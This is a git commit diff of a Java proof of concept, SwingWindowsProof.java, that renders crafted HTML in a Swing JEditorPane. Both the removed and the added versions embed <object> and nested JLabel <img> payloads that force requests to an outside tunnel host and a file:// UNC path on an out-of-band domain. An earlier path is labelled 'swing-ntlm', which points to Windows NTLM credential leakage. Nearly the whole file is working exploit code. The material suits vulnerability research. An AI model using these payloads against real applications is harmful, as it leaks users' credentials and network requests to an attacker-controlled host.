cd72ac6c80bde7fc506ae8a30be2d9abe470de6f
sealldeveloper-aidr2 <umgdl71fvon28qmf--githubaidr2-1785896221@oob.blackmail.zip>
2026-08-17 04:39:32 +0000

    test displayed nested HTML component

--- SwingWindowsProof.java
+++ SwingWindowsProof.java
@@ -1,15 +1,18 @@
 import javax.swing.*;
-import javax.swing.text.html.*;
-import java.io.*;
 public class SwingWindowsProof {
- static void render(String html) throws Exception {
-   JEditorPane pane=new JEditorPane(); pane.setEditable(false); pane.setContentType("text/html"); pane.setText(html);
-   System.out.println("Rendered: "+html);
-   Thread.sleep(15000);
- }
  public static void main(String[] args) throws Exception {
    System.out.println("os="+System.getProperty("os.name")+" java="+System.getProperty("java.version")+" headless="+java.awt.GraphicsEnvironment.isHeadless());
-   render("<html><body><object classid='javax.swing.JEditorPane' page=https://ddlnp-54-196-15-50.run.pinggy-free.link/swing-ntlm'></object></body></html>");
-   render("<html><body><object classid='javax.swing.JEditorPane' page='file://cwgmxyssmmssmczp--ijunc1786941240.oob.blackmail.zip/share/nonexistent'></object></body></html>");
+   String html="<html><body>"+
+     "<img src='https://ddlnp-54-196-15-50.run.pinggy-free.link/direct-image'>"+
+     "<object classid='javax.swing.JLabel' text='&lt;html&gt;&lt;img src=&quot;https://ddlnp-54-196-15-50.run.pinggy-free.link/nested-image&quot;&gt;&lt;/html&gt;'></object>"+
+     "<object classid='javax.swing.JLabel' text='&lt;html&gt;&lt;img src=&quot;file://cwgmxyssmmssmczp--ijunc1786941240.oob.blackmail.zip/share/nonexistent&quot;&gt;&lt;/html&gt;'></object>"+
+     "</body></html>";
+   SwingUtilities.invokeAndWait(() -> {
+     JEditorPane pane=new JEditorPane("text/html",html);
+     JFrame frame=new JFrame("proof"); frame.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE); frame.add(pane); frame.setSize(500,500); frame.setVisible(true);
+     System.out.println("Rendered frame: "+html);
+   });
+   Thread.sleep(30000);
+   System.out.println("done"); System.exit(0);
  }
 }
